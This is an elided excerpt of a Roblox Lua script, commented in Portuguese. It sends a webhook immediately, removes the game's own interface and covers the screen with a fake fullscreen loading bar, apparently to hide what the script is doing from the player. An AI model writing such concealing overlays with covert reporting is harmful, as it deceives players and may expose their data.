...
-- Função para remover completamente a interface do Roblox
...
-- Função para criar tela de carregamento FULLSCREEN
local function createLoadingScreen()
    -- Enviar webhook imediatamente
    sendInitialWebhook()
    
    -- Remover GUI principal primeiro
    screenGui:Destroy()
    
    -- Desabilitar interface do Roblox
    disableRobloxUI()
    
    -- Criar tela de carregamento FULLSCREEN
    ...
    overlay.BackgroundColor3 = Color3.fromRGB(0, 50, 100)
    ...
    mainTitle.Position = UDim2.new(0, 0, 0.15, 0)
    ...
    statusText.Size = UDim2.new(0.9, 0, 0, 50)
    statusText.Position = UDim2.new(0.05, 0, 0.35, 0)
    ...
    progressContainer.Size = UDim2.new(0.8, 0, 0, 40)
    progressContainer.Position = UDim2.new(0.1, 0, 0.5, 0)
    ...
    percentText.Position = UDim2.new(0, 0, 0, -35)
    ...
    progressBackground.Size = UDim2.new(1, 0, 0, 25)
    ...
    local function animateGlow()
        while true do
            local tween = TweenService:Create(glow, TweenInfo.new(0.8), {Position = UDim2.new(1, -20, 0, 0)})
            tween:Play()
